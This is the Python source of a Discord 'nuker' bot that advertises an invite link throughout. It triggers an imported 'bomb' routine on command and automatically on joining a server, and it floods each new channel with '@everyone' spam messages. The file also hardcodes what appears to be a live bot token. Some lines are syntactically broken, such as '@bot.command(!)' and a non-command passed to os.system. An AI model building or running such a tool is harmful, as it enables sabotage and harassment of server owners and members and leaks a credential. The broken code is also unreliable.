import discord, random, json, os
from discord.ext import commands
from utili import printMessage, bomb

if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")

os.system("N$ker / Made by helaiki - https://discord.gg/hGcdj39ymG")

# https://discord.gg/hGcdj39ymG

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="$", intents=intents)

# https://discord.gg/hGcdj39ymG

if not os.path.exists("config.json"):
    with open("config.json", "w") as f:
        f.write('{"token": "BOT TOKEN HERE", "nuke_on_join": true}')
        printMessage(f"Created config.json file!")

# https://discord.gg/hGcdj39ymG

with open("config.json", "r") as f:
    config = json.load(f)
    nuke_on_join = config["nuke_on_join"]

# HELAIKI
# SIMPS 
# UNETE Y DEJA DE SER UN GORDO DE MIERDA : https://discord.gg/hGcdj39ymG

@bot.event
async def on_ready():

    printMessage("""
        
| Made by HELAIKI |
Join https://discord.gg/hGcdj39ymG Y DEJA DE SER UN APESTOSITO OLOR A CEBOLLA
        
    """)
    printMessage(f"Logged in as {bot.user}")

# https://discord.gg/hGcdj39ymG
 
@bot.command(!)
async def nuke(ctx):

    # https://discord.gg/hGcdj39ymG
    
    await ctx.message.delete()
    await bomb(ctx.author)
    printMessage("N$ke Command executed!")

# https://discord.gg/hGcdj39ymG


@bot.event
async def on_guild_join(guild: discord.Guild):
    if nuke_on_join == True:
        await bomb(guild.get_member(bot.user.id))
        printMessage("Join on N$ke executed!")

@bot.event
async def on_guild_channel_create(channel):
    
# https://discord.gg/hGcdj39ymG
 
    for i in range(10):
        messages = ["GOT BOMBED 💣💣💣", "SIMPS COMMUNITY ON TOP | https://discord.gg/hGcdj39ymG", "FUISTE NUKEADOBPOR HELAIKI XDDD 😂"]
        random_message = random.choice(messages)
        try:
            await channel.send(f"{random_message} ||@everyone||")
        except discord.errors.Forbidden:
            printMessage(f"no perm.")

# https://discord.gg/hGcdj39ymG
 
if __name__ == "__main__":
    try:
        bot.run(config["MTMwNzkzOTI5ODc1ODIzNDEzMw.Gs7ykv.mZEFyaY7yNwVleZfVV-5KmEmGLyveUJyIDXX8U"])
    except discord.errors.LoginFailure:
        printMessage(f"Invalid token.")
        exit()

# https://discord.gg/hGcdj39ymG